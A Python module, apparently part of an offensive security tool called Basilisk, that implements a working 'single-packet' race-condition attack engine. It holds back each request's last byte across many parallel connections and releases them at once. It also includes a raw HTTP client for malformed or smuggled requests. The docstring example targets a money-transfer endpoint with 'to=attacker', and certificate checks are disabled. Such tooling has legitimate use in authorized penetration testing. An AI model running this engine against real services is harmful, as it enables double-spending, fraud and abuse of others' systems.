"""Raw HTTP engine for last-byte synchronization (single-packet attack).

Opens N parallel TCP connections, sends HTTP request minus the final byte,
waits for all connections to be ready, then writes the final byte
simultaneously to achieve true concurrent request delivery.

Usage::

    engine = LastByteSyncEngine(num_connections=30)
    request = build_raw_request("POST", "/api/transfer", "example.com",
                                body="amount=100&to=attacker")
    result = await engine.execute("example.com", 443, request, use_tls=True)
    for resp in result.responses:
        print(resp.status, resp.body[:100])
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import ssl
import time
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class RawHttpResponse:
    """Parsed response from a raw HTTP connection."""

    status: int
    headers: dict[str, str]
    body: str
    elapsed_ms: float
    connection_id: int
    error: str = ""


@dataclass
class LastByteSyncResult:
    """Aggregated results from a synchronized request burst."""

    responses: list[RawHttpResponse] = field(default_factory=list)
    sync_jitter_ms: float = 0.0
    total_connections: int = 0
    ready_connections: int = 0
    failed_connections: int = 0


def build_raw_request(
    method: str,
    path: str,
    host: str,
    *,
    headers: dict[str, str] | None = None,
    body: str = "",
    content_type: str = "application/x-www-form-urlencoded",
) -> bytes:
    """Build a complete HTTP/1.1 request as raw bytes.

    Args:
        method: HTTP method (GET, POST, PUT, etc.).
        path: Request path (e.g. /api/transfer).
        host: Host header value.
        headers: Additional headers to include.
        body: Request body string.
        content_type: Content-Type header value.
    """
    all_headers: dict[str, str] = {
        "Host": host,
        "Connection": "close",
        "User-Agent": "Basilisk/3.0",
    }
    if body:
        all_headers["Content-Type"] = content_type
        all_headers["Content-Length"] = str(len(body.encode("utf-8")))
    if headers:
        all_headers.update(headers)

    lines = [f"{method} {path} HTTP/1.1"]
    for name, value in all_headers.items():
        lines.append(f"{name}: {value}")
    lines.append("")
    if body:
        lines.append(body)
    else:
        lines.append("")

    return "\r\n".join(lines).encode("utf-8")


def parse_raw_response(data: bytes) -> tuple[int, dict[str, str], str]:
    """Parse raw HTTP response bytes into (status, headers, body).

    Returns (0, {}, "") on parse failure.
    """
    try:
        header_end = data.find(b"\r\n\r\n")
        if header_end == -1:
            return 0, {}, data.decode("utf-8", errors="replace")

        header_block = data[:header_end].decode("utf-8", errors="replace")
        body_bytes = data[header_end + 4:]

        lines = header_block.split("\r\n")
        status_parts = lines[0].split(" ", 2)
        status = int(status_parts[1]) if len(status_parts) >= 2 else 0

        headers: dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                name, _, value = line.partition(":")
                headers[name.strip()] = value.strip()

        body = body_bytes.decode("utf-8", errors="replace")
        return status, headers, body
    except Exception:
        return 0, {}, ""


class RawHttpClient:
    """Simple raw HTTP client for sending malformed requests over TCP.

    Unlike aiohttp, this does not normalize headers, allowing tests for
    HTTP smuggling and other protocol-level vulnerabilities.
    """

    def __init__(
        self,
        *,
        connect_timeout: float = 8.0,
        read_timeout: float = 10.0,
    ) -> None:
        self.connect_timeout = connect_timeout
        self.read_timeout = read_timeout

    async def send_raw(
        self,
        host: str,
        port: int,
        data: bytes,
        *,
        use_tls: bool = False,
    ) -> bytes | None:
        """Send raw bytes over TCP and return the response.

        Returns None on connection failure or timeout.
        """
        ssl_ctx: ssl.SSLContext | None = None
        if use_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        writer: asyncio.StreamWriter | None = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=self.connect_timeout,
            )
            writer.write(data)
            await writer.drain()

            response = await asyncio.wait_for(
                reader.read(65536),
                timeout=self.read_timeout,
            )
            return response if response else None
        except Exception:
            return None
        finally:
            if writer is not None:
                writer.close()
                with contextlib.suppress(Exception):
                    await writer.wait_closed()


class LastByteSyncEngine:
    """Single-packet attack via last-byte synchronization.

    Algorithm:
    1. Open N parallel TCP connections (TLS if needed)
    2. Send the full HTTP request minus the last byte on each connection
    3. Wait until all N connections have sent their prefixes (barrier)
    4. Release barrier — all connections write the final byte simultaneously
    5. Read all responses
    """

    def __init__(
        self,
        *,
        num_connections: int = 30,
        connect_timeout: float = 10.0,
        response_timeout: float = 15.0,
    ) -> None:
        self.num_connections = num_connections
        self.connect_timeout = connect_timeout
        self.response_timeout = response_timeout

    async def execute(
        self,
        host: str,
        port: int,
        request_bytes: bytes,
        *,
        use_tls: bool = False,
    ) -> LastByteSyncResult:
        """Execute a synchronized burst of identical requests.

        Args:
            host: Target hostname.
            port: Target port.
            request_bytes: Complete HTTP request as bytes.
            use_tls: Whether to use TLS.
        """
        if len(request_bytes) < 2:
            return LastByteSyncResult(total_connections=self.num_connections)

        prefix = request_bytes[:-1]
        last_byte = request_bytes[-1:]

        ready_event = asyncio.Event()
        ready_count = 0
        ready_lock = asyncio.Lock()
        target_count = self.num_connections

        ssl_ctx: ssl.SSLContext | None = None
        if use_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        results: list[RawHttpResponse] = []
        results_lock = asyncio.Lock()
        fire_times: list[float] = []
        fire_lock = asyncio.Lock()

        async def _single_connection(conn_id: int) -> None:
            nonlocal ready_count
            writer: asyncio.StreamWriter | None = None
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_ctx),
                    timeout=self.connect_timeout,
                )
            except Exception as exc:
                async with results_lock:
                    results.append(RawHttpResponse(
                        status=0, headers={}, body="", elapsed_ms=0,
                        connection_id=conn_id, error=f"connect: {exc}",
                    ))
                return

            try:
                # Send prefix (everything except last byte)
                writer.write(prefix)
                await writer.drain()

                # Signal readiness
                async with ready_lock:
                    ready_count += 1
                    if ready_count >= target_count:
                        ready_event.set()

                # Wait for all connections to be ready
                await asyncio.wait_for(
                    ready_event.wait(), timeout=self.connect_timeout,
                )

                # FIRE — send the last byte
                t0 = time.monotonic()
                writer.write(last_byte)
                await writer.drain()

                async with fire_lock:
                    fire_times.append(t0)

                # Read response
                data = await asyncio.wait_for(
                    reader.read(65536), timeout=self.response_timeout,
                )
                elapsed = (time.monotonic() - t0) * 1000

                status, headers, body = parse_raw_response(data)
                async with results_lock:
                    results.append(RawHttpResponse(
                        status=status, headers=headers, body=body,
                        elapsed_ms=elapsed, connection_id=conn_id,
                    ))
            except Exception as exc:
                async with results_lock:
                    results.append(RawHttpResponse(
                        status=0, headers={}, body="", elapsed_ms=0,
                        connection_id=conn_id, error=str(exc),
                    ))
            finally:
                if writer is not None:
                    writer.close()
                    with contextlib.suppress(Exception):
                        await writer.wait_closed()

        # Launch all connections
        tasks = [
            asyncio.create_task(_single_connection(i))
            for i in range(self.num_connections)
        ]

        # Timeout fallback: release barrier if not all connections ready
        async def _timeout_fallback() -> None:
            await asyncio.sleep(self.connect_timeout)
            ready_event.set()

        timeout_task = asyncio.create_task(_timeout_fallback())
        try:
            await asyncio.gather(*tasks)
        finally:
            timeout_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await timeout_task

        # Compute sync jitter
        jitter = 0.0
        if len(fire_times) > 1:
            jitter = (max(fire_times) - min(fire_times)) * 1000

        failed = len([r for r in results if r.error])

        return LastByteSyncResult(
            responses=results,
            sync_jitter_ms=jitter,
            total_connections=self.num_connections,
            ready_connections=ready_count,
            failed_connections=failed,
        )
